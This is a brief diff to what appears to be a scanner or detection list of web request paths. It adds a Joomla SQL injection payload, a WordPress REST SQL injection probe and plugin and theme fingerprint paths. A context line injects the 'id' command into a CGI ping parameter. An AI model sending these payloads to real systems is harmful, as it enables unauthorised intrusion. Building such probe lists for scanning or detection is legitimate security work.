@@ -287,3 +287,7 @@
 /cgi-bin/webctrl.cgi?action=pingtest_update&ping_addr=127.0.0.1%3Bid&B1=PING
 /wp-json/newfold-data/v1/verify/00000000000000000000000000000000
 /wp-json/wp/v2/users/me?context=edit
+/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=updatexml(0x23,concat(1,md5({{num}})),1)
+/wp-content/plugins/wp-fastest-cache/readme.txt
+/wp-json/vsfw/v1/videos?fields=%28SELECT%20424242*2%29%20as%20id
+/wp-content/themes/xstore/style.css
